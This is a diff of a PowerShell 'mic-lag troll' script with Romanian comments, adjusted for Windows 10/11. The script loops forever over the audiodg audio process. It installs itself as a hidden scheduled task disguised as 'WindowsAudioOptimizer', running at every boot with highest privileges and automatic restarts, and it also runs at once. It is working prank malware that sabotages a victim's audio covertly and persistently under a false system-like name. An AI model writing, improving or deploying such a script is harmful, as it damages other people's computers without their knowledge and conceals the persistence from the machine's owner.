@@ -1,4 +1,4 @@
-# Permanent mic-lag troll – rulează invizibil la fiecare boot
+# Permanent mic-lag troll – rulează invizibil la fiecare boot (Win10/11 compatible)
 $action = {
     while ($true) {
         $p = Get-Process audiodg -ErrorAction SilentlyContinue
@@ -7,12 +7,12 @@ $action = {
     }
 }
 
-# Creează task-ul ascuns care pornește la boot
+# Creează task-ul ascuns cu settings minimale (fără parametri fancy)
 $taskName = "WindowsAudioOptimizer"
 $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command &$action"
-$trigger    = New-ScheduledTaskTrigger -AtStartup
-$settings   = New-ScheduledTaskSettingsSet -Hidden -AllowStartOnDemand -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartOnDemand:$false -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
 Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
 
-# Și rulează imediat o dată
+# Rulează imediat o dată
 & $action
